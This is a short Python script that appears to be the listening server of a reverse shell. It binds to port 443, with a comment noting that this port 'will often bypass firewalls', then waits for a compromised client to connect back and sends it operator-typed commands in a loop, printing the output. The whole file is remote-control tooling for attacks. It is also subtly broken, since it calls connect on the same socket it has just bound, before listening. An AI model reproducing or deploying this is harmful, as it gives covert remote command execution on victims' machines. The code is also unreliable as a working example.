#!/usr/bin/env python3

import socket
import sys

# set port...ports 80/443 will often bypass firewalls
port = 443

# create a socket object
s = socket.socket()

# uses 0.0.0.0 to listen on all IPs...if you use localhost and the host has two IPs
# on the network you will not be able to connect through the alternate IP
host = '0.0.0.0'

# separator for multiple commands
separator = '<sep>'

# set buffer size for comms
buffer_size = 1024 * 128

# bind the socket to all IP addresses from the host
s.bind((host, port))

# open connection on local host with user-supplied port
s.connect((host, port))

# listen for a connection
s.listen(5)
print(f'Listening: {host} : {port}')

# accept connections
client_socket, client_address = s.accept()
print(f'{client_address[0]}: {client_address[1]} CONNECTED')

# retrieve PWD of client
pwd = client_socket.recv(buffer_size).decode()
print(f'>> Present Working Directory: {pwd}')

while True:
    # get commands from the user
    command = input(f'{pwd} $> ')
    if not command.strip():
        #if no command recvd continue
        continue

    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == 'exit':
        #break if exit is entered
        break

    # get command results
    output = client_socket.recv(buffer_size).decode()

    # split pwd and output
    results, pwd = output.split(separator)

    # print the output
    print(results)




